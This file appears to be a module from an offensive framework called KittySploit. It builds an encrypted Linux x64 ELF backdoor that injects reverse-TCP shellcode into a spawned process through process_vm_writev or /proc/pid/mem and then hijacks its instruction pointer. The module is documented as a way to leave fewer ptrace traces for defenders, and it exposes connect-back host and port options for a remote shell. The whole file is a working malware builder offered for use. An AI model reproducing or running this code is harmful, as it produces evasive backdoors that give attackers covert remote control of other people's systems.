#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
/proc/pid/mem and process_vm_writev injection evasion.

Spawns a host process, remote-mmaps via ptrace syscall gadget, writes shellcode
with process_vm_writev (or /proc/pid/mem fallback), then hijacks RIP.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import option_value
from lib.compile.linux_backdoor_helpers import build_encrypted_elf_backdoor
from lib.compile.proc_mem_inject import ProcMemInjectBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Linux proc_mem / vm_writev Evasion",
        "description": (
            "Generate a Linux x64 ELF that injects shellcode via process_vm_writev "
            "or /proc/pid/mem instead of PTRACE_POKEDATA — fewer ptrace write traces."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "references": [
            "https://man7.org/linux/man-pages/man2/process_vm_writev.2.html",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    target_cmd = OptString(
        "/bin/sleep 120",
        "Command spawned as injection host",
        False,
    )
    use_vm_writev = OptBool(True, "Use process_vm_writev (False = /proc/pid/mem)", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(0, "Sleep milliseconds before injection", False)
    output_name = OptString("proc_mem_evasion", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = ProcMemInjectBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_elf_backdoor(
            self,
            builder,
            build_source_kwargs={
                "target_cmd": str(option_value(self, "target_cmd") or "/bin/sleep 120"),
                "use_vm_writev": bool(option_value(self, "use_vm_writev")),
            },
            output_name="proc_mem_evasion",
            save_source_name="proc_mem_evasion.c",
        )
        if ok:
            mode = "process_vm_writev" if option_value(self, "use_vm_writev") else "/proc/pid/mem"
            print_info(f"Write mode: {mode} | Target: {option_value(self, 'target_cmd')}")
        return ok
